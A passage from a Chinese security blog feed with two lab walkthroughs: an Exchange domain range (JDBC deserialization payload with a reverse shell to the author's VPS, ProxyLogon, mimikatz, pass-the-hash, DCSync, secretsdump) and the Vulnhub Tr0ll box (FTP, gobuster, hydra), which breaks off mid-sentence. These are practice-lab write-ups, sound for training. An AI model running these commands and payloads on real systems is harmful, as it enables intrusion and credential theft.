class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br><span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<br><span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;vpsIP地址&quot;</span>,<br><span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3307</span>,<br><span class="hljs-string">&quot;info&quot;</span>: &#123;<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64编码后的反弹shell命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>,<br><span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br><span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br><span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>作用是向远程 vps 伪造的恶意 MySQL 服务发送 SQL 请求，服务端返回恶意 SQL 结果触发反序列化。将 payload 进行 url 编码后发送：<br><img src="/../images/Pasted%20image%2020250102192446.png"></p><p>成功执行反弹 shell：</p><p><img src="/../images/Pasted%20image%2020250102192558.png"></p><p><img src="/../images/Pasted%20image%2020250102192628.png"></p><p>获取入口机的 flag:</p><p><img src="/../images/Pasted%20image%2020250102192849.png"></p><h1 id="0x04-搭建代理"><a href="#0x04-搭建代理" class="headerlink" title="0x04 搭建代理"></a>0x04 搭建代理</h1><p>工具：<a href="https://github.com/LxxxSec/FastProxy">FastProxy</a>，建议仅在靶场使用。</p><p><img src="/../images/Pasted%20image%2020250102195523.png"></p><p>在远程 vps 中启动 app.py 脚本：</p><p><img src="/../images/Pasted%20image%2020250102200259.png"></p><p>复制上方启动脚本的 curl 命令，在入口机中执行：</p><p><img src="/../images/Pasted%20image%2020250102200453.png"></p><p>socks 代理信息在 vps 端。在 kali 上编辑<code>/etc/proxychains4.conf</code>：</p><p><img src="/../images/Pasted%20image%2020250102205146.png"></p><p>测试一下，结果显示代理搭建成功：</p><p><img src="/../images/Pasted%20image%2020250102210315.png"></p><h1 id="0x05-内网扫描"><a href="#0x05-内网扫描" class="headerlink" title="0x05 内网扫描"></a>0x05 内网扫描</h1><p>查看入口机 ip 地址：</p><p><img src="/../images/Pasted%20image%2020250102210500.png"></p><p>进入 &#x2F;tmp 目录，使用 fscan 扫描整个网段：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/fscan -h 172.22.3.12/</span><span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">1</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">253</span>  is alive<br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>    段存活数量为: <span class="hljs-number">5</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>    段存活数量为: <span class="hljs-number">4</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>  段存活数量为: <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">5</span><br><span class="hljs-number">172.22.3.9:445</span> open<br><span class="hljs-number">172.22.3.26:445</span> open<br><span class="hljs-number">172.22.3.9:808</span> open<br><span class="hljs-number">172.22.3.2:445</span> open<br><span class="hljs-number">172.22.3.9:443</span> open<br><span class="hljs-number">172.22.3.9:139</span> open<br><span class="hljs-number">172.22.3.2:139</span> open<br><span class="hljs-number">172.22.3.26:135</span> open<br><span class="hljs-number">172.22.3.26:139</span> open<br><span class="hljs-number">172.22.3.9:135</span> open<br><span class="hljs-number">172.22.3.2:135</span> open<br><span class="hljs-number">172.22.3.9:81</span> open<br><span class="hljs-number">172.22.3.9:80</span> open<br><span class="hljs-number">172.22.3.2:88</span> open<br><span class="hljs-number">172.22.3.9:8172</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">15</span><br>start vulscan<br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-PC<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>          XIAORANG\XIAORANG-PC       <br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN16<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> WebTitle:http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         code:<span class="hljs-number">403</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-EXC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>     <span class="hljs-string">[+]</span>DC XIAORANG\XIAORANG-WIN16    Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>           XIAORANG\XIAORANG-EXC01    Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> WebTitle:http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      code:<span class="hljs-number">403</span> len:<span class="hljs-number">1157</span>   title:<span class="hljs-number">403</span> - 禁止访问: 访问被拒绝。<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   code:<span class="hljs-number">404</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/auth/logon.aspx?url=https%3a%2f%2f172.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>%2fowa%2f&amp;reason=<span class="hljs-number">0</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">28237</span>  title:Outlook<br>已完成 <span class="hljs-number">15</span>/<span class="hljs-number">15</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">21</span>.323436507s<br></code></pre></td></tr></table></figure><p>端口开放情况：</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.3.9</span>：<span class="hljs-number">445</span>, <span class="hljs-number">808</span>, <span class="hljs-number">443</span>, <span class="hljs-number">139</span>, <span class="hljs-number">135</span>, <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">8172</span><br><span class="hljs-number">172.22.3.2</span>：<span class="hljs-number">445</span>, <span class="hljs-number">139</span>, <span class="hljs-number">135</span>, <span class="hljs-number">88</span> <br><span class="hljs-number">172.22.3.26</span>：<span class="hljs-number">445</span>, <span class="hljs-number">135</span>, <span class="hljs-number">139</span><br>// <span class="hljs-number">88</span> 端口用于域控服务器的身份验证功能<br></code></pre></td></tr></table></figure><p>内网信息搜集结果：</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.3.2</span>XIAORANG-WIN16域控<br><span class="hljs-number">172.22.3.9</span>XIAORANG-EXC01Exchange邮件服务器<br><span class="hljs-number">172.22.3.26</span>XIAORANG-PC    个人电脑<br><span class="hljs-number">172.22.3.12</span>                 入口机<br></code></pre></td></tr></table></figure><h1 id="0x06-横向移动-Exchange邮件服务器"><a href="#0x06-横向移动-Exchange邮件服务器" class="headerlink" title="0x06 横向移动-Exchange邮件服务器"></a>0x06 横向移动-Exchange邮件服务器</h1><p><strong>ProxyLogon</strong>(CVE-2021-26855) 是一个存在于 Microsoft Exchange Server 的漏洞，可以使攻击者绕过身份验证并模拟用户。</p><p>EXP: <a href="https://github.com/herwonowr/exprolog">https://github.com/herwonowr/exprolog</a></p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> python3 exprolog.py -t <span class="hljs-number">172.22.3.9</span> -e administrator<span class="hljs-variable">@xiaorang</span>.lab<br></code></pre></td></tr></table></figure><p>成功拿到 SYSTEM 权限：</p><p><img src="/../images/Pasted%20image%2020250103144323.png"></p><p>用提供的命令测试一下：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">proxychains curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/xxala.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;whoami /all&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k<br></code></pre></td></tr></table></figure><p>成功：</p><p><img src="/../images/Pasted%20image%2020250103144447.png"></p><p>添加个用户：</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> foobar pass<span class="hljs-variable">@123</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span><br>net localgroup administrators foobar <span class="hljs-operator">/</span><span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250103151142.png"></p><p>接下来使用 kali 自带的 <strong>remmina</strong> 远程登录该用户，由于靶机是 Windows 系统，选择 RDP 协议。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains remmina</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250103151751.png"></p><p>获取邮件服务器的 flag：</p><p><img src="/../images/Pasted%20image%2020250103152735.png"></p><h1 id="0x07-横向移动-域控"><a href="#0x07-横向移动-域控" class="headerlink" title="0x07 横向移动-域控"></a>0x07 横向移动-域控</h1><p>配置 remmina 的 share folder 共享本地文件：</p><p><img src="/../images/Pasted%20image%2020250103154250.png"></p><p>[mimikatz](<a href="https://github.com/gentilkiwi/mimikatz">gentilkiwi&#x2F;mimikatz: A little tool to play with Windows security</a>)：内网渗透神器，可以从 lsass.exe 进程中提取明文密码、哈希值、PIN 码和 Kerberos 票据，它还可以执行传递哈希值、传递票据、建立票据、伪造域管理凭证令牌等诸多功能。</p><p>以管理员权限打开 cmd，进入 <strong>mimikatz</strong> 相应的目录下，执行以下命令：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\mimikatz.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt; <span class="hljs-number">1.txt</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250104162409.png"></p><p><img src="/../images/Pasted%20image%2020250103155045.png"></p><p><img src="/../images/Pasted%20image%2020250103172142.png"></p><p><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">BloodHound</a>：是一款以可视化图形分析域环境中的关系的工具。<br><a href="https://www.freebuf.com/articles/web/288370.html">渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境 - FreeBuf网络安全行业门户</a></p><p>使用 <strong>BloodHound</strong> 进行信息收集。因为只有 SYSTEM 用户有域权限，所以不能用新加的用户，需要用 ProxyLogon 的 shell 来执行命令：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">proxychains curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/bzjtp.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;C:\Users\foobar\Desktop\Collectors/SharpHound.exe -c all --OutputDirectory C:/Users/foobar/Desktop/&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250103161949.png"></p><p>把收集到的数据放到本地分析：<br><a href="https://www.freebuf.com/articles/web/288370.html">渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境 - FreeBuf网络安全行业门户</a></p><p><img src="/../images/Pasted%20image%2020250104172541.png"></p><p>发现 exchange 上的域用户有 <strong>writeDacl</strong> 权限。DACL (Discretionary Access Control List) 是访问控制列表的一部分，定义了哪些用户或组可以访问某个资源，以及能执行哪些操作。用户可以通过 WriteDACL 权限将自己添加为资源的完全控制者。</p><p><a href="%5Bhttps://github.com/SecureAuthCorp/impacket%5D(https://github.com/SecureAuthCorp/impacket" title="https://github.com/SecureAuthCorp/impacket">Impacket</a>):是用于处理网络协议的 Python 类的集合。<br><a href="https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit=GNeeeu0DfE1K=GQWWrW4D">Impacket脚本利用指南（上） - 先知社区</a></p><p>前面已经拿到了<code>XIAORANG-EXC01$</code>这个机器用户的 NTLM hash，所以可以先用 Impacket 中的 <strong>psexec.py</strong> 进行 <strong>PTH</strong> (Pass-the-Hash，利用 NTLM hash 冒充用户访问网络资源或系统，无需知道密码本身），获取 system 权限的可交互shell：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">proxychains python<span class="hljs-number">3</span> psexec.py -hashes :<span class="hljs-number">03447</span>ce<span class="hljs-number">0</span>f<span class="hljs-number">4</span>a<span class="hljs-number">9908</span>d<span class="hljs-number">77</span><span class="hljs-keyword">c</span><span class="hljs-number">860954</span>baa<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>e XIAORANG/XIAORANG-EXC<span class="hljs-number">01</span>\$<span class="hljs-title">@172</span>.<span class="hljs-number">22.3</span>.<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>上传<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">powerview.ps1</a>，为 Zhangtong 用户添加 <strong>DCSync</strong> 权限。DCSync 权限允许用户模拟<strong>域控</strong>请求帐户凭据，这是一种高权限操作，常见于密码提取攻击。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;cd C:/Users/foobar/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIde Zhangtong -Rights DCSync -Verbose&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250104181135.png"><br>  接着利用 Zhangtong 用户导出域内哈希：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 secretsdump.py xiaorang.lab/Zhangtong@<span class="hljs-number">172.22.3.2</span> -hashes :<span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4 -just-dc<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250104181507.png"></p><p>域管哈希为：7acbc09a6c0efd81bfa7d5a1d4238beb，用 <strong>wmiexec</strong> 登录域控：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 wmiexec.py -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang/administrator@<span class="hljs-number">172.22.3.2</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250104181925.png"></p><p><img src="/../images/Pasted%20image%2020250103175520.png"></p><p><img src="/../images/Pasted%20image%2020250103175613.png"></p><p>获取域控的 flag:</p><p><img src="/../images/Pasted%20image%2020250103175756.png"></p><h1 id="0x08-横向移动-个人电脑"><a href="#0x08-横向移动-个人电脑" class="headerlink" title="0x08 横向移动-个人电脑"></a>0x08 横向移动-个人电脑</h1><p>还有个 172.22.3.26 没用到。刚刚导出的域内哈希显示还有个用户是 Lumia：</p><p><img src="/../images/Pasted%20image%2020250104182241.png"></p><p>在域控上新增一个管理员用户：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user bridge </span>pass@123 /<span class="hljs-built_in">add</span><br>net localgroup administrators<span class="hljs-built_in"> bridge </span>/add<br></code></pre></td></tr></table></figure><p>登录域控，win+r 输入 dsa.msc，在 Active Directory 修改 Lumia 用户的密码：</p><p><img src="/../images/Pasted%20image%2020250104182558.png"></p><p>登录 172.22.3.26 的 rdp 后发现桌面有一个 secret.zip，不过需要解压密码。</p><p>内网中还存在Exchange服务，访问 <a href="https://172.22.3.9/owa/">https://172.22.3.9/owa/</a> ，使用 Lumia 用户的密码登录，查看邮件：</p><p><img src="/../images/Pasted%20image%2020250104183122.png"></p><p><img src="/../images/Pasted%20image%2020250104183139.png"></p><p><strong>zip2john</strong> 爆破，手机号为 18763918468，解压拿到个人电脑的 flag:</p><p><img src="/../images/Pasted%20image%2020250103182217.png"></p><h1 id="0x09-Conclusion"><a href="#0x09-Conclusion" class="headerlink" title="0x09 Conclusion"></a>0x09 Conclusion</h1><p>第一次接触内网渗透，打靶过程非常吃力，基本遇到的全是新知识，继续加油吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;Exchange 靶</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="http://example.com/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-Tr0ll</title>
    <link href="http://example.com/2025/01/01/Vulnhub-Tr0ll/"/>
    <id>http://example.com/2025/01/01/Vulnhub-Tr0ll/</id>
    <published>2025-01-01T08:45:13.000Z</published>
    <updated>2025-01-01T13:36:04.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场没有太多新知识，更加考察的是思维能力。</p><p><img src="/../images/Pasted%20image%2020250101211842.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.86.132</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101165320.png"></p><p>接下来对这三个端口进行详细扫描：</p><p><img src="/../images/Pasted%20image%2020250101165850.png"></p><p>21 端口的 ftp 服务允许匿名登录，且操作简单，先从它入手 ，然后再探索 80 端口，最后是 22 端口。</p><h1 id="0x02-FTP渗透"><a href="#0x02-FTP渗透" class="headerlink" title="0x02 FTP渗透"></a>0x02 FTP渗透</h1><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">192.168.86.132</span><br>anonymous<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101170247.png"></p><p>查看该 ftp 服务器的文件，发现一个名为 lol.pcap 的文件。</p><p><img src="/../images/Pasted%20image%2020250101170419.png"></p><p>PCAP（Packet Capture）文件是一种网络数据包捕获文件格式，通常用于存储通过网络接口捕获的原始数据包，通常用 Wireshark 查看：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">get</span> <span class="hljs-keyword">lol</span>.pcap<br>wireshark <span class="hljs-keyword">lol</span>.pcap<br></code></pre></td></tr></table></figure><p>发现一条下载文件的 FTP 数据包记录：</p><p><img src="/../images/Pasted%20image%2020250101173708.png"></p><p>从这条记录中我们看到了一个关键词：sup3rs3cr3tdirlol。之前说过这种格式是 leetspeak，实际上就是 supersecretdirlol。从这个关键词中的 dir 可以猜到，这是一个目录路径，web 渗透时可能会用到。</p><h1 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h1><p>浏览器访问 <a href="http://192.168.86.132/">http://192.168.86.132</a>:</p><p><img src="/../images/Pasted%20image%2020250101174810.png"></p><p>查看源代码，没发现有用信息。尝试目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.86.132</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101175436.png"></p><p>访问 <a href="http://192.168.86.132/secret">http://192.168.86.132/secret</a>:</p><p><img src="/../images/Pasted%20image%2020250101175214.png"></p><p>好像被嘲讽了，源代码也没有有用信息。</p><p>刚才从 ftp 服务器获取到一个目录：sup3rs3cr3tdirlol，访问一下看看：</p><p><img src="/../images/Pasted%20image%2020250101175357.png"></p><p>发现个名为 rofmao 的文件，把他下载下来。当我们拿到一个文件的时候，不要贸然地查看或执行，避免产生安全问题。</p><p>首先查看这个文件的相关信息：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span> roflmao<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101180019.png"></p><p>是一个可执行文件。使用 binwalk 扫描它，看是否存在嵌套文件：</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">binwalk roflmao</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101181220.png"></p><p>没发现有嵌套文件。那么就执行这个文件看看会发生什么。</p><p>首先查看文件权限，发现没有执行权限：</p><p><img src="/../images/Pasted%20image%2020250101181725.png"></p><p>修改文件权限为 777，并执行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 roflmao<br>./rofmao<br></code></pre></td></tr></table></figure><p>打印出一句话：</p><p><img src="/../images/Pasted%20image%2020250101181910.png"></p><p>并且提示了<code>0x0856BF</code> 是个地址，那么访问 <a href="http://192.168.86.132/0x0856BF">http://192.168.86.132/0x0856BF</a> 试试:</p><p><img src="/../images/Pasted%20image%2020250101182755.png"></p><p>看到两个目录，挨个点进去看。</p><p>先看第一个，有一个 which_one_lol.txt ，内容是：</p><p><img src="/../images/Pasted%20image%2020250101183034.png"></p><p>看起来像是用户名。</p><p>再看第二个，文件名的意思是，这个文件夹包含密码。里面果然有一个 Pass.txt，内容是：</p><p><img src="/../images/Pasted%20image%2020250101183150.png"></p><p>爆破出正确的用户名及密码就可以尝试 ssh 登录了。</p><h1 id="0x04-密码爆破"><a href="#0x04-密码爆破" class="headerlink" title="0x04 密码爆破"></a>0x04 密码爆破</h1><p>之前靶场里介绍过 hydra ，这里依旧使用 hydra 破解密码：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">sudo hydra -L which_one_lol<span class="hljs-selector-class">.txt</span> -P Pass<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.86.132 </span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101192930.png"></p><p>但是并没有找到与 Pass.txt 中的密码对应的用户名。那么就是密码错了？这里其实很难想到，密码会不会是文件名 Pass.txt？考察的应该是 CTF 的发散思维。</p><p>把 Pass.txt 加入密码文件，同时 hydra 建议使用 4 个线程，修改为下述命令在尝试：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">hydra -L which_one_lol<span class="hljs-selector-class">.txt</span> -P Pass<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.86.132 -t 4</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101193755.png"></p><p>ssh 无法连接了，看来存在防暴力破解的机制，等几分钟再试试:</p><p><img src="/../images/Pasted%20image%2020250101202422.png"></p><p>显示有一个目标没完成，那么把后几个用户名放到前面，以保证所有用户名都被 hydra 试过了。这次爆破成功了：</p><p><img src="/../images/Pasted%20image%2020250101202608.png"></p><h1 id="0x05-ssh登录及提权"><a href="#0x05-ssh登录及提权" class="headerlink" title="0x05 ssh登录及提权"></a>0x05 ssh登录及提权</h1><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">ssh <span class="hljs-attribute">overflow</span><span class="hljs-keyword">@192</span>.168.86.132<br></code></pre></td></tr></table></figure><p>登录成功后首先查看一些基本信息：</p><p><img src="/../images/Pasted%20image%2020250101201210.png"></p><p>为了方便操作，使用 python 创建一个交互式的 shell：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101201543.png"></p><p>查看 &#x2F;etc&#x2F;shadow 显示没有权限。就在这时，ssh 登录被弹出了：</p><p><img src="/../images/Pasted%20image%2020250101201707.png"></p><p>提示 TIMES UP，时间到了，根据这个关键词可以联想到定时任务。查看 <code>/etc/crontab</code>:</p><p><img src="/../images/Pasted%20image%2020250101202717.png"></p><p>很遗憾并没有权限。</p><p>那么搜索定时任务的日志 cronlog 